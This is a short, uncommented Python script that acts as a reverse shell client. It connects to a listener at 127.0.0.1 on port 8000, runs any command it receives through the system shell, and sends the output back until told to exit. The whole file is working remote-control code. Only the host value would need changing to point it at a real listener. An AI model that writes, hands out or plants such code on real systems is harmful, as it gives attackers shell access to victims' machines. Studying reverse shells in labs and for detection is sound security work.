import socket,subprocess

host = '127.0.0.1'
port = 8000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host,port))

while 1:
	command = s.recv(1024)
	command = command.decode('utf-8')

	if command != "exit":
		sh = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

		out, err = sh.communicate()

		result = out + err
		s.send(result)
	else:
		break
s.close()
